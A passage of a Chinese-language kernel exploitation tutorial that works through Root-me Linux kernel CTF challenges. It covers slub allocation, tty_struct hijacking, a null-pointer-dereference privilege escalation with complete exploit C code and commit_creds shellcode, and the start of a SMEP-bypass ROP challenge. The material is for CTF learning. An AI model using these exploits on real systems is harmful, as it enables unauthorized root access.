    {
        if (__builtin_constant_p(size)) {
            if (size > KMALLOC_MAX_CACHE_SIZE)
                return kmalloc_large(size, flags);
    #ifndef CONFIG_SLOB
            if (!(flags & GFP_DMA)) {
                int index = kmalloc_index(size);
                if (!index)
                    return ZERO_SIZE_PTR;
                return kmem_cache_alloc_trace(kmalloc_caches[index],
                        flags, size);
            }
    #endif
        }
        return __kmalloc(size, flags);
    }
我们现在只需要明确，`kmalloc`其实是使用`slab/slub`分配器，现在多见的是`slub`分配器。这个分配器通过一个多级的结构进行管理。首先有`cache`层，`cache`是一个结构，里边通过保存空对象，部分使用的对象和完全使用中的对象来管理，对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。
**`slab`分配器严格按照`cache`去区分，不同`cache`的无法分配在一页内，`slub`分配器则较为宽松，不同`cache`如果分配相同大小，可能会在一页内。**
那么我们若能通过UAF漏洞劫持一个`tty_struct`我们就能劫持其内部的所有函数指针，进而控制程序流程。
关于`tty_struct`的定义位于`/source/include/linux/tty.h#L282`：
    struct tty_struct {
        int    magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;
        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;    /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;        /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;        /* winsize_mutex */
        unsigned long stopped:1,    /* flow_lock */
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;    /* Bytes free for queue */
        int flow_change;
        struct tty_struct *link;
        struct fasync_struct *fasync;
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        spinlock_t files_lock;        /* protects tty_files list */
        struct list_head tty_files;
    #define N_TTY_BUF_SIZE 4096
        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
    } __randomize_layout;
我们接下来重点关注`tty_struct -> ops`，它的类型是`const struct
tty_operations`，这个结构体的定义位于`/source/include/linux/tty_driver.h#L253`：
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    } __randomize_layout;
通常，我们希望劫持`ioctl`这个函数指针。
## 0x05 以[Root-me]LinKern x86 – Null pointer dereference为例
🏅：本题考查点 – Null pointer dereference in Kernel
本漏洞的相关说明已在Kernel Pwn 学习之路(一)中说明，此处不再赘述。
###  Init 文件分析
内核仍未开启任何保护。
###  LKMs 文件分析
仅开启了NX保护。
####  题目逻辑分析
#####  tostring_write
函数首先打印`"Tostring: write()n"`，然后调用`kmalloc`分配一个Chunk。
>
> `kmalloc`函数用于在内核中分配`Chunk`，它有两个参数，第一个参数是`Size`，第二个参数称为`flag`，通过其以几个方式控制`kmalloc`的行为。
>
> 由于`kmalloc`函数可以最终通过调用 `__get_free_pages` 来进行，因此，这些`flag`通常带有 `GFP_` 前缀。
>
> 最通常使用的标志是`GFP_KERNEL`, 这意味着此次分配是由运行在内核空间的进程进行的。换言之,
> 这意味着调用函数的是一个进程在尝试执行一个系统调用。
>
> 使用 `GFP_KENRL` 将意味着`kmalloc`能够使当前进程在内存不足的情况下执行睡眠操作来等待一页. 一个使用`GFP_KERNEL`
> 来分配内存的函数必须是可重入的并且不能在原子上下文中运行. 若当前进程睡眠, 内核将采取正确的动作来定位一些空闲内存,
> 或者通过刷新缓存到磁盘或者交换出去一个用户进程的内存。
>
> `GFP_KERNEL`不一定是正确分配标志; 有时`kmalloc`从一个进程的上下文的外部进行调用。这类的调用可能发生在中断处理, tasklet,
> 和内核定时器中. 在这个情况下, 当前进程不应当被置为睡眠, 并且驱动应当使用一个
> `GFP_ATOMIC`标志来代替`GFP_KERNEL`。此时，内核将正常地试图保持一些空闲页以便来满足原子分配。
>
> 当使用`GFP_ATOMIC`时，`kmalloc`甚至能够使用最后一个空闲页。如果最后一个空闲页也不存在将会导致分配失败。
>
> 除此之外，还有如下的标志可供我们选择(更完整的标志列表请查阅`linux/gfp.h`)：
>
> `GFP_USER` – 由用户态的程序来分配内存，可以使用睡眠等待机制。
>
> `GFP_HIGHUSER` – 从高地址分配内存。
>
> `GFP_NOIO` – 分配内存时禁止使用任何I/O操作。
>
> `GFP_NOFS` – 分配内存时禁止调用fs寄存器。
>
> `GFP_NOWAIT` – 立即分配，不做等待。
>
> `__GFP_THISNODE` – 仅从本地节点分配内存。
>
> `GFP_DMA` – 进行适用于`DMA`的分配，这应该仅应用于`kmalloc`缓存，否则请使用`SLAB_DMA`创建的`slab`。
此处程序使用的是`GFP_DMA`标志。
在那之后，程序将用户传入的数据向该`Chunk`写入`length`个字节，并将末尾置零。
然后程序验证我们传入数据的前十个字节是否为`*`，若是，程序会从第十一字节开始逐字节进行扫描，根据不同的’命令’执行不同的操作。
在那之后程序会从第十一字节开始间隔一个`x00`或`n`字节进行扫描，根据不同的’命令’执行不同的操作。
    H ： 将tostring->tostring_read这个函数指针置为tostring_read_hexa。
    D ： 将tostring->tostring_read这个函数指针置为tostring_read_dec。
    S ： 将tostring结构体清除，所有的成员变量置为NULL或0，释放tostring->tostring_stack指向的chunk。
    N ： 首先调用local_strtoul(bufk+i+11,NULL,10)，若此时tostring->tostring_stack为NULL，则执行tostring结构体的初始化，将local_strtoul(bufk+i+11,NULL,10)的返回值乘1024作为size调用kmalloc函数将返回地址作为tostring->tostring_stack所指向的值，同时设置pointer_max这个成员变量的值为size/sizeof(long long int)，设置tostring->tostring_read这个函数指针为tostring_read_hexa。
否则，程序将会在`tostring->tostring_stack`中插入后续的值。
#####  tostring_read
程序将直接调用tostring->tostring_read这个函数指针
####  题目漏洞分析
程序在调用tostring->tostring_read这个函数指针时没有做指针有效性验证，这将导致程序试图调用一个空指针，而在此版本的Kernel中，程序已经关闭了`mmap_min_addr`的保护，这将导致我们可以`mmap`一个0地址处的内存映射，若我们能在0地址处写入shellcode，程序将会在调用空指针时调用此位置的shellcode，于是可以直接提权。
我们的目标是调用`commit_creds(prepare_kernel_cred(0))`，那么我们的shellcode就可以是：
    xor eax,eax;
    call commit_creds;
    call prepare_kernel_cred;
    ret;
其中`commit_creds`和`prepare_kernel_cred`函数的地址可以在`/proc/kallsyms`中定位到。
可以使用`Radare2`生成`shellcode`:
    rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"
####  动态调试验证
首先`QEMU`的启动指令为：
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/Null_pointer_dereference/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
然后在`QEMU`使用以下命令确定相关`Section`的地址：
    lsmod
    grep 0 /sys/module/[module_name]/sections/.text
    grep 0 /sys/module/[module_name]/sections/.data
    grep 0 /sys/module/[module_name]/sections/.bss
    # 0xC8824000
    # 0xC88247E0
    # 0xC8824A80
在IDA和GDB中进行设置：
⚠️ **：在IDA设置后会导致反编译结果出错，请谨慎设置！**
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80
首先验证我们分析的逻辑是正确的。
我们构建如下PoC发送：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void){
        int fd = open("/dev/tostring",2);
        write(fd,"**********H",11);
        write(fd,"**********D",11);
        write(fd,"**********S",11);
        write(fd,"**********N",11);
        write(fd,"AAAABBBB",9);
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
预期情况下，程序应当依次执行H、D、S、N四个命令，并在最后写入”AAAABBBB”。
发现逻辑正确，那么我们尝试劫持EIP，发送以下PoC：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "xe9xeaxbexadx0b"; // jmp 0xbadbeef
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
成功劫持，那么我们只需要替换掉Shellcode即可完成提权。
###  Final Exploit
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "x31xc0xe8xe9x11x07xc1xe8x74x0ex07xc1xc3";
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        system("/bin/sh");
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
## 0x06 以[Root-me]LinKern x86 – basic ROP为例
🏅：本题考查点 – ROP in Kernel、Bypass SMEP
###  调试信息
`QEMU`启动指令：
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/basic_ROP/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
几个重要的地址：
    .text : 0xC8824000
    .data : 0xC88241A0
    .bss  : 0xC8824440
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88241A0 -s .bss 0xC8824440
###  Init 文件分析
还是正常加载LKMs，但是这次没有关闭`mmap_min_addr`防护。
根据题目说明，本次内核启动了`SMEP`保护，这将导致当程序进入`Ring 0`的内核态时，不得执行用户空间的代码。
**⭕️：检测`smep`是否开启可以使用以下命令：**
###  LKMs文件分析
和往常一样，用户态仅开启了NX保护。
####  题目逻辑分析&漏洞分析
本次题目逻辑很简单，就是一个简单的读入操作，当我们向内核发送数据时有一个很明显的栈溢出会发生。
程序在向buf写入值时并没有做最大size限制，于是我们可以很容易的触发栈溢出。
###  控制EIP
我们若发送以下PoC，程序应该会断在`0xdeadbeef`：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 